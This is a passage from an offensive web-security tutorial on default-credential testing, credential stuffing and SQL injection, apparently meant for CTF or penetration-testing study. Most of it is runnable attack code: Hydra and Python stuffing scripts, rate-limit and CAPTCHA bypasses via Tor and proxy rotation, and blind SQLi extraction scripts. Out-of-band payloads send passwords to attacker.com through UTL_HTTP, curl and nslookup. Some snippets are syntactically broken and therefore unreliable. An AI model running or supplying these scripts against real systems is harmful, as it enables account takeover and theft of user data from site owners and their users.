**Locations to check:**

- `/admin`, `/administrator`, `/manager`, `/console`
- `:8080/manager/html` (Tomcat)
- `/phpmyadmin`
- `:3000` (Grafana)
- `:9090` (Prometheus)
- `:5601` (Kibana)
- SSH on alternate ports

```bash
# Automated admin panel discovery
feroxbuster -u http://target.com \
  -w /usr/share/seclists/Discovery/Web-Content/admin-panels.txt

# Test default credentials
curl http://target.com/admin -u "admin:admin"
```

### Device-Specific Defaults

**IoT/Embedded:**

```bash
# Camera defaults
admin:12345
admin:
root:vizxv

# Router defaults
admin:admin
admin:password
# [Unverified] Check RouterPasswords.com for model-specific defaults
```

**Testing Script:**

```bash
#!/bin/bash
# default_creds_test.sh

URL="$1"
CREDS_FILE="$2"

while IFS=: read -r user pass; do
  response=$(curl -s -o /dev/null -w "%{http_code}" \
    -u "$user:$pass" "$URL")
  if [ "$response" == "200" ]; then
    echo "[+] Valid credentials: $user:$pass"
  fi
done < "$CREDS_FILE"
```

**Usage:**

```bash
bash default_creds_test.sh http://target.com/admin /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt
```

## Credential Stuffing

### Attack Methodology

**Credential stuffing uses breached username:password pairs from other services, exploiting password reuse.**

**Difference from Brute Force:**

- Brute force: Many passwords per account
- Credential stuffing: One password per account (from breach)

### Breach Databases

**Sources (for authorized testing only):**

```bash
# Public breach aggregators
# [Unverified] haveibeenpwned.com API (check if email is breached)
# [Unverified] dehashed.com, leak-lookup.com (credential lookups)

# Downloaded breach collections
# Collection #1 (773M records)
# Anti Public Combo List
# [Inference] These are illegal to possess in many jurisdictions without authorization
```

**Format Preparation:**

```bash
# Typical breach format
email@example.com:password123

# Convert to username:password
cut -d: -f1 breaches.txt | cut -d@ -f1 > usernames.txt
cut -d: -f2 breaches.txt > passwords.txt

# Create credential pairs
paste -d: usernames.txt passwords.txt > credentials.txt
```

### Tools and Techniques

**1. Hydra:**

```bash
# HTTP POST form credential stuffing
hydra -C credentials.txt target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Login failed"

# Parameters:
# -C: Colon-separated username:password file
# F=: Failure string to detect unsuccessful login
# S=: Success string (alternative)

# With session handling
hydra -C credentials.txt target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:H=Cookie\: session=abc:F=incorrect"
```

**2. Burp Suite Intruder:**

```
1. Capture login request in Proxy
2. Send to Intruder (Ctrl+I)
3. Select attack type: Pitchfork
4. Mark username and password parameters as payload positions
5. Payloads:
   - Payload set 1: Usernames
   - Payload set 2: Passwords
6. Options â†’ Grep-Match: Add success indicator
7. Start attack
8. Filter by response length/grep match
```

**3. Custom Python Script:**

```python
#!/usr/bin/env python3
import requests
from concurrent.futures import ThreadPoolExecutor

def attempt_login(credential):
    username, password = credential.split(':')
    url = 'http://target.com/login'
    data = {'username': username, 'password': password}
    
    try:
        response = requests.post(url, data=data, timeout=5)
        if 'Welcome' in response.text:  # Success indicator
            print(f'[+] Valid: {username}:{password}')
            with open('valid_creds.txt', 'a') as f:
                f.write(f'{username}:{password}\n')
    except Exception as e:
        pass

with open('credentials.txt', 'r') as f:
    credentials = f.read().splitlines()

with ThreadPoolExecutor(max_workers=10) as executor:
    executor.map(attempt_login, credentials)
```

**Usage:**

```bash
python3 credential_stuffing.py
```

**4. Selenium-Based (for JavaScript-heavy sites):**

```python
from selenium import webdriver
from selenium.webdriver.common.by import By

driver = webdriver.Chrome()

with open('credentials.txt', 'r') as f:
    for line in f:
        username, password = line.strip().split(':')
        
        driver.get('http://target.com/login')
        driver.find_element(By.NAME, 'username').send_keys(username)
        driver.find_element(By.NAME, 'password').send_keys(password)
        driver.find_element(By.NAME, 'submit').click()
        
        if 'dashboard' in driver.current_url:
            print(f'[+] Valid: {username}:{password}')
```

### Rate Limiting Bypass

**1. Distributed IPs:**

```bash
# Tor circuit rotation
# Edit /etc/tor/torrc:
MaxCircuitDirtiness 10

# Proxychains with Tor
proxychains4 hydra -C creds.txt target.com http-post-form "..."
```

**2. User-Agent Rotation:**

```bash
# Hydra with random user agents
hydra -C creds.txt target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:H=User-Agent\: RANDOMUA:F=incorrect"
```

**3. Timing/Throttling:**

```bash
# Delay between attempts
hydra -C creds.txt -t 1 -W 5 target.com http-post-form "..."
# -t 1: 1 task (sequential)
# -W 5: 5 second delay
```

**4. IP Rotation (with proxies):**

```python
import requests

proxies_list = [
    'http://proxy1:port',
    'http://proxy2:port',
]

for idx, cred in enumerate(credentials):
    proxy = proxies_list[idx % len(proxies_list)]
    requests.post(url, data=data, proxies={'http': proxy, 'https': proxy})
```

### Detection Indicators

**Successful Credential Stuffing Indicators:**

- Status code: `302` (redirect to dashboard)
- Response length significantly different
- `Set-Cookie` header present
- Success keywords: "Welcome", "Dashboard", "Logout"

**Burp Intruder Analysis:**

```
Options â†’ Grep - Extract:
- Extract "Welcome, [username]" to identify successful logins
- Extract Set-Cookie headers
```

**Response Analysis:**

```bash
# Compare response lengths
awk '{print $1, length($2)}' hydra_output.txt | sort -nk2 | uniq
```

### CAPTCHA Bypass Considerations

[Inference] CAPTCHA implementations vary widely. Common bypass methods include:

**1. API Endpoints Without CAPTCHA:**

```bash
# Web login has CAPTCHA, but API doesn't
curl -X POST http://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"pass123"}'
```

**2. CAPTCHA Reuse:**

```bash
# Solve CAPTCHA once, reuse token
curl http://target.com/login \
  -d "username=admin&password=pass1&captcha=token123"
curl http://target.com/login \
  -d "username=admin&password=pass2&captcha=token123"
```

**3. CAPTCHA Services:**

```python
# [Unverified] 2captcha, anticaptcha services can solve CAPTCHAs programmatically
# [Inference] These services use human workers or ML models
```

### Session Management After Successful Stuffing

```bash
# Extract session cookies from successful login
curl -c cookies.txt http://target.com/login -d "user=valid&pass=validpass"

# Use session for further exploitation
curl -b cookies.txt http://target.com/api/sensitive-data

# Check session lifetime
sleep 3600 # Wait 1 hour
curl -b cookies.txt http://target.com/api/sensitive-data
# If still works, no session timeout
```

### Legal and Ethical Considerations

[Unverified] Credential stuffing against systems without explicit authorization is illegal in most jurisdictions under computer fraud laws (CFAA in US, Computer Misuse Act in UK, etc.). Only perform these techniques in authorized CTF environments or penetration testing engagements with written permission.

---

# SQL Injection (SQLi)

## SQL Basics and Queries

### SQL Fundamentals

Understanding SQL structure is prerequisite to crafting injection payloads and interpreting database responses.

**Basic SQL SELECT query:**

```sql
SELECT column1, column2 FROM table_name WHERE condition;
```

**Query components:**

**SELECT clause:** Specifies columns to retrieve.

```sql
SELECT username, email FROM users;          -- Specific columns
SELECT * FROM users;                        -- All columns
SELECT DISTINCT role FROM users;            -- Unique values only
SELECT COUNT(*) FROM users;                 -- Aggregate count
SELECT SUM(salary), AVG(salary) FROM employees;  -- Aggregate functions
```

**FROM clause:** Specifies source table.

```sql
SELECT * FROM users;
SELECT * FROM users, orders;                -- Multiple tables (Cartesian join)
```

**WHERE clause:** Filters results based on conditions.

```sql
SELECT * FROM users WHERE id = 1;
SELECT * FROM users WHERE username = 'admin';
SELECT * FROM users WHERE age > 18 AND status = 'active';
SELECT * FROM users WHERE id IN (1, 2, 3);
SELECT * FROM users WHERE name LIKE 'a%';   -- Wildcard: starts with 'a'
```

**JOIN operations:** Combine data from multiple tables.

```sql
SELECT users.username, orders.order_date 
FROM users 
INNER JOIN orders ON users.id = orders.user_id;

SELECT * FROM users LEFT JOIN orders ON users.id = orders.user_id;
```

**ORDER BY clause:** Sorts results.

```sql
SELECT * FROM users ORDER BY username ASC;
SELECT * FROM users ORDER BY id DESC;
SELECT * FROM users ORDER BY age ASC, username DESC;  -- Multiple columns
```

**LIMIT clause:** Restricts result count.

```sql
SELECT * FROM users LIMIT 10;               -- First 10 rows
SELECT * FROM users LIMIT 10 OFFSET 5;      -- Skip first 5, return next 10
SELECT * FROM users LIMIT 5, 10;            -- Alternative syntax (skip 5, return 10)
```

**GROUP BY clause:** Aggregates results by column values.

```sql
SELECT role, COUNT(*) FROM users GROUP BY role;
SELECT department, AVG(salary) FROM employees GROUP BY department HAVING AVG(salary) > 50000;
```

**Data modification queries:**

```sql
INSERT INTO users (username, email, password) VALUES ('newuser', 'user@example.com', 'hash');

UPDATE users SET email = 'newemail@example.com' WHERE id = 1;

DELETE FROM users WHERE id = 1;
```

**Conditional operators in WHERE clause:**

```sql
= Equal to
!= or <> Not equal to
> Greater than
< Less than
>= Greater than or equal to
<= Less than or equal to
BETWEEN value1 AND value2
IN (value1, value2, value3)
LIKE pattern (% wildcard, _ single character)
IS NULL
IS NOT NULL
AND All conditions true
OR Any condition true
NOT Negate condition
```

**NULL handling (critical for SQLi):**

```sql
SELECT * FROM users WHERE password IS NULL;
SELECT * FROM users WHERE password IS NOT NULL;

-- In conditional logic, NULL creates interesting results
SELECT * FROM users WHERE username = NULL;  -- Returns 0 rows (NULL never equals)
SELECT * FROM users WHERE 1 = 1;            -- Returns all rows
SELECT * FROM users WHERE 1 = 2;            -- Returns 0 rows
```

---

### SQL Operators and Functions

Exploitation often leverages operators and functions to extract data or bypass logic.

**String operators:**

```sql
-- Concatenation (varies by database)
SELECT CONCAT(username, '@', email) FROM users;     -- MySQL
SELECT username || '@' || email FROM users;         -- PostgreSQL, SQLite, Oracle
SELECT username + '@' + email FROM users;           -- MSSQL

-- String length
SELECT username FROM users WHERE LENGTH(username) > 5;

-- Substring extraction
SELECT SUBSTRING(password, 1, 3) FROM users;        -- MySQL, MSSQL
SELECT SUBSTR(password, 1, 3) FROM users;           -- Oracle, SQLite
SELECT password[1:3] FROM users;                    -- PostgreSQL (array notation)
```

**Comparison operators in WHERE:**

```sql
-- Case-insensitive comparison (COLLATE varies by DB)
SELECT * FROM users WHERE username = 'Admin' COLLATE NOCASE;

-- LIKE pattern matching (vulnerable to wildcard injection)
SELECT * FROM users WHERE username LIKE 'a%';
SELECT * FROM users WHERE username LIKE '%admin%';
SELECT * FROM users WHERE username LIKE '_dmin';    -- _ matches single character
```

**Mathematical operators:**

```sql
SELECT * FROM users WHERE id = 1 + 1;               -- Evaluates to id = 2
SELECT * FROM users WHERE age > 10 * 2;             -- Evaluates to age > 20
SELECT * FROM users WHERE id = POWER(2, 3);         -- id = 8
```

**Logical operators in injected payloads:**

```sql
-- Classic injection: comment terminates original query
SELECT * FROM users WHERE username = 'admin' -- comment
-- Becomes: SELECT * FROM users WHERE username = 'admin'

-- OR operator bypasses authentication
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'anything'
-- Condition always true; returns admin user

-- UNION combines result sets (requires same column count)
SELECT id, username FROM users UNION SELECT id, name FROM products
-- Returns both user IDs/usernames and product IDs/names
```

**Database-specific functions (information extraction):**

```sql
-- MySQL
SELECT VERSION();                           -- Database version
SELECT DATABASE();                          -- Current database name
SELECT USER();                              -- Current user
SELECT @@version, @@datadir, @@basedir;    -- System variables

-- PostgreSQL
SELECT version();
SELECT current_user;
SELECT current_database();

-- MSSQL
SELECT @@version;
SELECT SYSTEM_USER;
SELECT DB_NAME();

-- Oracle
SELECT * FROM v$version;
SELECT user FROM dual;
```

**Information schema queries (database structure enumeration):**

```sql
-- MySQL
SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'dbname';
SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_NAME = 'users';

-- PostgreSQL
SELECT tablename FROM pg_tables WHERE schemaname = 'public';
SELECT column_name FROM information_schema.columns WHERE table_name = 'users';

-- MSSQL
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;
SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users';

-- Oracle
SELECT table_name FROM user_tables;
SELECT column_name FROM user_tab_columns WHERE table_name = 'USERS';
```

---

### Database Type Identification

Different databases have distinct syntax and functions; identifying the backend directs exploit strategy.

**Identification via response analysis:**

```bash
# Error messages often reveal database type
curl "http://example.com/page?id=1'"

# MySQL error: You have an error in your SQL syntax...
# PostgreSQL error: syntax error at or near...
# MSSQL error: Incorrect syntax near...
# Oracle error: ORA-00933: SQL command not properly ended
```

**Identification via time-based responses:**

```bash
# MySQL SLEEP function
curl "http://example.com/page?id=1 AND SLEEP(5)"

# PostgreSQL pg_sleep function
curl "http://example.com/page?id=1 AND pg_sleep(5)"

# MSSQL WAITFOR DELAY
curl "http://example.com/page?id=1 AND WAITFOR DELAY '00:00:05'"

# Response delay indicates database type
```

**Identification via version output:**

```bash
# MySQL version format
SELECT VERSION();  -- 5.7.31-28-log

# PostgreSQL version format
SELECT version();  -- PostgreSQL 12.4...

# MSSQL version format
SELECT @@version;  -- Microsoft SQL Server 2019...

# Oracle version format
SELECT * FROM v$version;  -- Oracle Database 19c...
```

---

## In-Band SQLi (Union-based, Error-based)

In-band SQLi retrieves results within HTTP response; attacker sees extracted data directly.

---

### Union-Based SQLi

UNION combines result sets from multiple SELECT queries; attacker hijacks query to append malicious SELECT.

**Prerequisites:**

1. Original query must be SELECT statement
2. Number of columns in injected SELECT must match original query
3. Data types must be compatible (or castable)
4. Attacker must see results in HTTP response

**Determining column count:**

Attacker must discover how many columns original query selects before successful UNION injection.

```bash
# Method 1: ORDER BY technique
curl "http://example.com/page?id=1 ORDER BY 1"     # Usually succeeds
curl "http://example.com/page?id=1 ORDER BY 2"     # Continues
curl "http://example.com/page?id=1 ORDER BY 3"     # Continues
curl "http://example.com/page?id=1 ORDER BY 4"     # Error (column 4 doesn't exist)

# Column count = 3 (last successful ORDER BY)

# ORDER BY uses column number; if original query selects 3 columns,
# ORDER BY 1-3 valid; ORDER BY 4 throws error
```

```bash
# Method 2: UNION SELECT technique (less reliable but faster)
curl "http://example.com/page?id=-1 UNION SELECT NULL"          # Error: needs 2+ columns
curl "http://example.com/page?id=-1 UNION SELECT NULL, NULL"    # Error: needs 3+ columns
curl "http://example.com/page?id=-1 UNION SELECT NULL, NULL, NULL"  # Success (3 columns)

# Column count = 3

# Use id=-1 to ensure original query returns 0 rows; UNION query dominates results
```

**Data type discovery:**

After determining column count, identify which columns accept specific data types.

```bash
# Using UNION with specific data types
curl "http://example.com/page?id=-1 UNION SELECT 1, 2, 3"
# If all columns accept integers, response displays: 1 2 3

# Then test string data
curl "http://example.com/page?id=-1 UNION SELECT 'a', 'b', 'c'"
# If error on column 1: column 1 is integer-only; use 1 or CAST('text' AS INTEGER)

# Mixed types
curl "http://example.com/page?id=-1 UNION SELECT 1, 'username', 'email'"
# Indicates: column 1 integer, columns 2-3 strings
```

**Basic data extraction:**

```bash
# Replace placeholder columns with database functions
curl "http://example.com/page?id=-1 UNION SELECT 1, VERSION(), 3"
# Response shows: 1 MySQL 5.7.31-28-log 3

curl "http://example.com/page?id=-1 UNION SELECT 1, USER(), 3"
# Response shows: 1 root@localhost 3

curl "http://example.com/page?id=-1 UNION SELECT 1, DATABASE(), 3"
# Response shows: 1 webapp_db 3
```

**Extract table names (MySQL example):**

```bash
curl "http://example.com/page?id=-1 UNION SELECT 1, TABLE_NAME, 3 FROM information_schema.TABLES WHERE TABLE_SCHEMA = DATABASE()"

# Response lists all tables in current database
```

**Extract column names:**

```bash
curl "http://example.com/page?id=-1 UNION SELECT 1, COLUMN_NAME, 3 FROM information_schema.COLUMNS WHERE TABLE_NAME = 'users'"

# Response lists all columns in 'users' table
```

**Extract sensitive data:**

```bash
curl "http://example.com/page?id=-1 UNION SELECT id, username, password FROM users"

# Response displays user IDs, usernames, and passwords (hashed or plaintext)
```

**Practical exploitation workflow:**

```bash
# Step 1: Identify injection point
curl "http://example.com/product?id=1'"
# Error indicates SQL injection

# Step 2: Determine column count via ORDER BY
for i in {1..10}; do
  response=$(curl -s "http://example.com/product?id=1 ORDER BY $i")
  if echo "$response" | grep -q "error"; then
    echo "Column count: $((i-1))"
    break
  fi
done

# Step 3: Test UNION SELECT with correct column count
curl -s "http://example.com/product?id=-1 UNION SELECT 1,2,3,4,5"

# Step 4: Identify which columns display in response
# If response shows "Product: 1, Price: 2, Description: 3, ..."
# Columns 1-3 displayed; column 2 and 3 injectable

# Step 5: Extract data using displayed columns
curl -s "http://example.com/product?id=-1 UNION SELECT 1, VERSION(), 3, 4, 5"
curl -s "http://example.com/product?id=-1 UNION SELECT 1, GROUP_CONCAT(table_name), 3, 4, 5 FROM information_schema.tables WHERE table_schema=database()"
```

**Bypassing WHERE clause filters:**

```bash
# Original query: SELECT * FROM products WHERE id = $input
# Input: 1' AND username='admin
# Becomes: SELECT * FROM products WHERE id = 1' AND username='admin'
# [Unverified] Syntax depends on context; may cause error

# Better approach: Use comment to terminate query
Input: 1' UNION SELECT 1,2,3-- -
# Becomes: SELECT * FROM products WHERE id = 1' UNION SELECT 1,2,3-- -
# SQL comment (-- -) terminates original query
```

**LIMIT clause handling:**

```bash
# Original query may include LIMIT clause
# Input: 1 UNION SELECT 1,2,3 LIMIT 1
# May still work if LIMIT applies to entire query

# To control results, inject LIMIT within UNION
Input: 1 UNION SELECT 1,2,3 LIMIT 1 UNION SELECT 4,5,6 LIMIT 1
# [Unverified] Syntax may be invalid; depends on query structure

# Safer: Use LIMIT to skip original results
Input: 1 UNION SELECT 1,2,3 LIMIT 1,1
# Skips original result (1 row), shows UNION result
```

---

### Error-Based SQLi

Error-based SQLi extracts data by triggering database errors that include query results.

**Principle:**

Force database error containing desired information in error message.

**Extracting data via error messages:**

```bash
# Method 1: Invalid casting (MySQL CAST function)
curl "http://example.com/page?id=1 AND CAST((SELECT VERSION()) AS INT)"
# MySQL tries to cast string to INT; error message includes VERSION()

# Method 2: Duplicate entry error (MySQL)
curl "http://example.com/page?id=1 AND 1 GROUP BY CONCAT(VERSION(), '~', FLOOR(RAND()*2))"
# If group results in duplicate, error message includes data

# Method 3: ExtractValue (MySQL)
curl "http://example.com/page?id=1 AND extractvalue(1, CONCAT('~', (SELECT VERSION())))"
# Error: XPATH syntax error; includes VERSION()

# Method 4: UpdateXML (MySQL)
curl "http://example.com/page?id=1 AND updatexml(1, CONCAT('~', (SELECT VERSION())), 1)"
# Error message includes VERSION()
```

**Extended WHERE clause (MySQL-specific):**

```sql
-- MySQL allows XPath in extractvalue
SELECT * FROM users WHERE id = 1 AND extractvalue(1, CONCAT('~', (SELECT username FROM users LIMIT 1)));

-- Error: XPATH syntax error near '~admin'
-- Attacker extracts: admin (first username)
```

**CASE statement errors:**

```sql
SELECT * FROM users WHERE id = 1 AND CASE WHEN (SELECT COUNT(*) FROM users) > 0 THEN 1/0 ELSE 0 END;

-- If true, division by zero error
-- Attacker infers truthiness of condition
```

**Practical error-based exploitation:**

```bash
# Step 1: Identify injection and database type
curl "http://example.com/page?id=1'"
# MySQL error visible

# Step 2: Test error-based extraction
curl "http://example.com/page?id=1 AND extractvalue(1, CONCAT('~', (SELECT DATABASE())))"

# Step 3: Parse error message for results
# Response: ERROR 1105 (HY000): XPATH syntax error near '~webapp_db'
# Extracted: webapp_db

# Step 4: Systematically extract data
curl "http://example.com/page?id=1 AND extractvalue(1, CONCAT('~', (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())))"

# Response error includes all table names
```

**Error-based vs Union-based comparison:**

[Inference] Error-based generally slower (requires parsing error messages) but works when:

- Original query returns multiple rows (UNION confusing)
- Column count unknown (ORDER BY works but Union-based fails)
- Data types incompatible with display columns

**Blind vs visible error handling:**

```bash
# Visible errors (developer/debug mode enabled)
# Application displays full error messages including SQL syntax

# Hidden errors (production mode)
# Application shows generic "Database Error" message
# Error-based SQLi impossible; blind or out-of-band required

# Test visibility
curl "http://example.com/page?id=1' AND 1/0"
# If specific error shown: errors visible
# If generic page shown: errors hidden
```

---

## Blind SQLi (Boolean-based, Time-based)

Blind SQLi extracts data without direct output; attacker infers results through response variations (boolean) or timing (time-based).

---

### Boolean-Based Blind SQLi

Attacker sends queries with true/false conditions; response differences indicate truthiness.

**Principle:**

Boolean conditions alter application behavior; attacker crafts true and false conditions to deduce information.

```bash
# Baseline (likely true, returns normal response)
curl "http://example.com/page?id=1 AND 1=1"

# False condition (altered response indicates false evaluation)
curl "http://example.com/page?id=1 AND 1=2"

# True condition using database function
curl "http://example.com/page?id=1 AND LENGTH(DATABASE()) > 0"
# If response matches baseline: true (database name exists)
# If response differs: false

# Progressively narrow results
curl "http://example.com/page?id=1 AND LENGTH(DATABASE()) = 4"  # False (more characters)
curl "http://example.com/page?id=1 AND LENGTH(DATABASE()) = 7"  # True (7 characters)
```

**Character extraction via binary search:**

```bash
# Extract first character of database name
curl "http://example.com/page?id=1 AND SUBSTRING(DATABASE(), 1, 1) = 'a'"  # False
curl "http://example.com/page?id=1 AND SUBSTRING(DATABASE(), 1, 1) = 'w'"  # True (starts with 'w')

# Narrow to specific character
curl "http://example.com/page?id=1 AND SUBSTRING(DATABASE(), 1, 1) > 'm'"   # True (w > m)
curl "http://example.com/page?id=1 AND SUBSTRING(DATABASE(), 1, 1) > 't'"   # False (w < t)
curl "http://example.com/page?id=1 AND SUBSTRING(DATABASE(), 1, 1) < 't'"   # True
curl "http://example.com/page?id=1 AND SUBSTRING(DATABASE(), 1, 1) = 'w'"   # True

# Extracted: 'w'
# Continue for each character position
```

**Practical boolean-based workflow:**

```bash
# Step 1: Establish baseline response
baseline=$(curl -s "http://example.com/page?id=1")
baseline_length=${#baseline}

# Step 2: Send false condition
false_response=$(curl -s "http://example.com/page?id=1 AND 1=2")
false_length=${#false_response}

# Step 3: If lengths differ, boolean-based possible
if [ "$baseline_length" -ne "$false_length" ]; then
  echo "Boolean-based blind SQLi confirmed"
fi

# Step 4: Extract data via conditions
# Determine database name length
for i in {1..20}; do
  response=$(curl -s "http://example.com/page?id=1 AND LENGTH(DATABASE()) = $i")
  if [ ${#response} -eq "$baseline_length" ]; then
    echo "Database name length: $i"
    db_len=$i
    break
  fi
done

# Step 5: Extract each character
for pos in $(seq 1 $db_len); do
  for ascii in $(seq 97 122); do  # a-z ASCII values
    char=$(printf \\$(printf '%03o' $ascii))
    response=$(curl -s "http://example.com/page?id=1 AND SUBSTRING(DATABASE(), $pos, 1) = '$char'")
    if [ ${#response} -eq "$baseline_length" ]; then
      echo -n "$char"
      break
    fi
  done
done
echo ""  # Database name extracted
```

**Advanced boolean techniques:**

```bash
# SLEEP() combined with conditional (boolean + timing)
curl "http://example.com/page?id=1 AND IF(1=1, SLEEP(5), 0)"
# True: 5-second delay
# False: no delay

# Bitwise operators for faster extraction
curl "http://example.com/page?id=1 AND ORD(SUBSTRING(DATABASE(),1,1)) & 1"
# & 1: checks if last bit set (odd number)
# If result non-zero: true
# Faster than character-by-character (can extract via bit patterns)

# Comparison operators with functions
curl "http://example.com/page?id=1 AND SUBSTRING(USERNAME FROM 1 FOR 1) BETWEEN 'A' AND 'M'"
# BETWEEN returns true/false; attacker narrows range
```

**Response differentiation methods:**

```bash
# Text content differs
# Baseline: "Welcome, admin"
# False: "Invalid user"

# HTTP status code differs
# True: 200 OK
# False: 404 Not Found

# Response time differs (subtle; boolean-based can include timing)
# True: 100ms
# False: 50ms (no delay processing)

# HTML element presence differs
# Baseline includes: <img id="product-image" />
# False: <img> omitted

# Attacker script must detect which differs; then extracts data
```

---

### Time-Based Blind SQLi

Attacker sends queries with conditional delays; response time indicates condition truthiness.

**Principle:**

Database delays execution for true conditions; attacker measures response time to infer truthiness.

```bash
# No delay (control; baseline)
time curl "http://example.com/page?id=1 AND 1=2"

# With delay if true
time curl "http://example.com/page?id=1 AND IF(1=1, SLEEP(5), 0)"
# 5-second delay indicates true condition

# With delay if condition on database
time curl "http://example.com/page?id=1 AND IF(LENGTH(DATABASE())=7, SLEEP(5), 0)"
# 5-second delay indicates database name is 7 characters
```

**Time-based payloads by database:**

```bash
# MySQL
curl "http://example.com/page?id=1' AND SLEEP(5)-- -"
curl "http://example.com/page?id=1' AND IF(1=1, SLEEP(5), 0)-- -"

# PostgreSQL
curl "http://example.com/page?id=1' AND pg_sleep(5)-- -"
curl "http://example.com/page?id=1' AND CASE WHEN 1=1 THEN pg_sleep(5) END-- -"

# MSSQL
curl "http://example.com/page?id=1' AND WAITFOR DELAY '00:00:05'-- -"
curl "http://example.com/page?id=1' AND IF(1=1, WAITFOR DELAY '00:00:05', '')-- -"

# Oracle
curl "http://example.com/page?id=1' AND DBMS_LOCK.SLEEP(5)-- -"
curl "http://example.com/page?id=1' AND BEGIN DBMS_LOCK.SLEEP(5); END;-- -"
```

**Character extraction via time-based blind:**

```bash
# Extract first character of database name
# Test if character is 'w' (ASCII 119)
curl "http://example.com/page?id=1 AND IF(ORD(SUBSTRING(DATABASE(),1,1))=119, SLEEP(5), 0)"
# 5-second delay: character is 'w'
# No delay: character is not 'w'

# More efficient: binary search (halving possibilities each test)
# ASCII values 97-122 (a-z)
# Test middle value (109, 'm')
curl "http://example.com/page?id=1 AND IF(ORD(SUBSTRING(DATABASE(),1,1))>109, SLEEP(5), 0)"
# If delay: character in w-z range
# No delay: character in a-l range

# Continue bisecting until character identified
```

**Practical time-based blind workflow:**

```bash
#!/bin/bash
# Extract database name via time-based blind SQLi

TARGET="http://example.com/page?id=1"
THRESHOLD=3  # Seconds; if response > THRESHOLD, true

# Function: test condition with SLEEP
test_condition() {
  local condition=$1
  local start=$(date +%s%N | cut -b1-13)
  curl -s "$TARGET AND IF($condition, SLEEP(5), 0)" > /dev/null
  local end=$(date +%s%N | cut -b1-13)
  local duration=$(( (end - start) / 1000 ))
  
  if [ $duration -gt $((THRESHOLD * 1000)) ]; then
    return 0  # True
  else
    return 1  # False
  fi
}

# Step 1: Determine database name length
db_len=0
for i in {1..20}; do
  if test_condition "LENGTH(DATABASE())=$i"; then
    db_len=$i
    echo "Database length: $i"
    break
  fi
done

# Step 2: Extract each character
db_name=""
for pos in $(seq 1 $db_len); do
  for ascii in $(seq 97 122); do  # a-z
    char=$(printf \\$(printf '%03o' $ascii))
    if test_condition "ORD(SUBSTRING(DATABASE(),$pos,1))=$ascii"; then
      db_name="$db_name$char"
      echo "Database: $db_name"
      break
    fi
  done
done

echo "Final database name: $db_name"
```

**Faster time-based extraction (bit-by-bit):**

```bash
# Extract via bit operations (8 tests per character vs 26 tests)

extract_char_via_bits() {
  local pos=$1
  local char_ascii=0
  
  for bit in {7..0}; do
    # Test if bit is set
    local condition="(ORD(SUBSTRING(DATABASE(),$pos,1)) >> $bit) & 1"
    if test_condition "$condition"; then
      char_ascii=$((char_ascii + (1 << bit)))
    fi
  done
  
  printf \\$(printf '%03o' $char_ascii)
}

# Extract first character
char=$(extract_char_via_bits 1)
echo "First character: $char"
```

**Timing variations and challenges:**

```bash
# Network latency affects timing
# Internet connection: variable delay (100-500ms)
# Local network: consistent delay (1-10ms)
# [Inference] Timing attacks more reliable on local networks; internet-based less reliable

# SLEEP() granularity
# MySQL SLEEP(): 1-second granularity; 5 seconds reliable
# PostgreSQL pg_sleep(): 1-second; 3 seconds reliable
# MSSQL WAITFOR: 1-second; 2 seconds reliable
# [Inference] Shorter delays increase false positives; longer delays visible but slow

# Database query optimization
# Optimized queries may execute before SLEEP
# Non-optimized queries may delay before SLEEP
# Timing varies per query; attacking multiple fields requires calibration
```

**Reverse time-based (true = fast, false = slow):**

```bash
# Standard: IF(condition, SLEEP(5), 0)
# True causes delay; false instant

# Reverse: IF(condition, 0, SLEEP(5))
# False causes delay; true instant

# If attacker can't detect delays, use reverse
# Different response patterns help identify true/false
```

---

## Out-of-Band SQLi

Out-of-band SQLi exfiltrates data through side channels (DNS, HTTP) outside main HTTP response; useful when in-band/blind SQLi impossible.

---

### DNS-Based Out-of-Band SQLi

Attacker controls DNS nameserver; database sends queries to attacker's DNS, exfiltrating data in subdomain.

**Requirements:**

1. Target database server has outbound DNS access
2. Attacker controls domain and DNS nameserver
3. Database must support DNS resolution in query context

**MySQL DNS exfiltration via UDF (User-Defined Function):**

```sql
-- Requires sys_exec UDF or similar
-- [Unverified] Specific implementation; requires custom MySQL build or vulnerable version

SELECT INTO OUTFILE '/tmp/file' FROM (SELECT CONCAT('test.attacker.com')) t;
-- File contains: test.attacker.com (triggers DNS resolution)
```

**MSSQL DNS exfiltration via xp_cmdshell:**

```bash
# MSSQL stored procedure for command execution
curl "http://example.com/page?id=1; EXEC xp_cmdshell 'nslookup $(SELECT @@version).attacker.com'"

# nslookup performs DNS lookup; database version embedded in subdomain
# Attacker captures DNS query at nameserver
# Query contains: nslookup [version].attacker.com
# DNS logs reveal version
```

**Oracle DNS exfiltration via UTL_HTTP:**

```sql
SELECT UTL_HTTP.request('http://attacker.com/?data=' || (SELECT password FROM users WHERE id=1)) FROM dual;
```

**PostgreSQL DNS exfiltration via copy_to:**

```sql
-- PostgreSQL can't directly trigger DNS, but may via libpq if misconfigured
-- [Unverified] Specific PostgreSQL versions; generally not viable

-- Alternative: copy to program
COPY (SELECT password FROM users) TO PROGRAM 'curl http://attacker.com/?data=' || (SELECT password FROM users LIMIT 1);
```

**Practical DNS out-of-band setup:**

```bash
# Step 1: Set up attacker's domain (e.g., attacker.com)
# Point nameserver to attacker's DNS server

# Step 2: Run DNS server capturing queries
# Using tcpdump
tcpdump -i eth0 'udp port 53' -w dns.pcap

# Using dnstop (interactive DNS query viewer)
dnstop eth0

# Using dig with query logging
dig @attacker.com +trace example.com +log

# Step 3: Craft payload exfiltrating data via DNS
curl "http://target.com/page?id=1' UNION SELECT 1, CONCAT((SELECT password FROM users LIMIT 1), '.attacker.com')-- -"

# Step 4: Monitor DNS queries at attacker's nameserver
# DNS logs show: admin_password_hash.attacker.com.
# Attacker extracts: admin_password_hash

# Step 5: Parse DNS logs for exfiltrated data
grep "attacker.com" dns.log | sed 's/.attacker.com.*//' > extracted_data.txt
```

**DNS tunneling for data exfiltration:**

```bash
# Large datasets require multiple DNS queries
